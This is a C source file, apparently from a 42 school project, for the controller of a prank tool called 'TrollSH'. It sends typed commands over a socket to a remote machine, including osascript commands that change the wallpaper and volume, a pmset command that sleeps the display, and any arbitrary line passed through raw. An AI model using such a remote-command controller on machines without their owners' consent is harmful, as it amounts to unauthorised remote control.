/* ******************************--------************************************ */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   controller_cmds.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: someone <someone@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/mm/dd hh:mm:ss by someone           #+#    #+#             */
/*   Updated: 2018/mm/dd hh:mm:ss by someone          ###   ########.troll    */
/*                                                                            */
/* ******************************--------************************************ */

#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include "controller.h"

static void		send_cmd(int sockfd, char *line)
{
	char	*cmd;
	char	*chk;

	chk = ft_strchr(line, ' ');
	if (ft_strstart(line, "chgwall"))
	{
		cmd = ft_strdup("osascript -e 'tell application \"System Events\" to ");
		ft_stradd(&cmd, "tell desktop 1 to set picture to ");
		ft_stradd(&cmd, (chk) ? chk + 1 : chk);
		ft_stradd(&cmd, "'");
	}
	else if (ft_strstart(line, "sleepdisp"))
		cmd = ft_strdup("pmset displaysleepnow");
	else if (ft_strstart(line, "setvol"))
	{
		cmd = ft_strdup("osascript -e 'tell application \"System Events\" to ");
		ft_stradd(&cmd, "set volume ");
		ft_stradd(&cmd, (chk) ? chk + 1 : chk);
		ft_stradd(&cmd, "'");
	}
	else
		cmd = line;
	ft_putstr_fd(cmd, sockfd);
	if (cmd && cmd != line)
		free(cmd);
}

int				send_msg(int sockfd, t_rl_opts *opts)
{
	int					ret;
	char				*msgi;
	char				buffer[32];
	const char			*prompt = "\033[1;31mTrollSH\033[0;39m$ ";

	if (recv(sockfd, buffer, sizeof(buffer), MSG_PEEK | MSG_DONTWAIT) == 0)
	{
		ft_putendl_fd("Server kick ya out!", STDERR_FILENO);
		return (FALSE);
	}
	ret = TRUE;
	if ((msgi = ft_readline(prompt, opts, NULL)))
	{
		if (ft_strcmp(msgi, "exit") == 0)
			ret = FALSE;
		else if (ft_strcmp(msgi, "") == 0)
			ft_putendl_fd("Not a suitable command!", STDERR_FILENO);
		else
			send_cmd(sockfd, msgi);
	}
	else
		return (FALSE);
	ft_strdel(&msgi);
	return (ret);
}
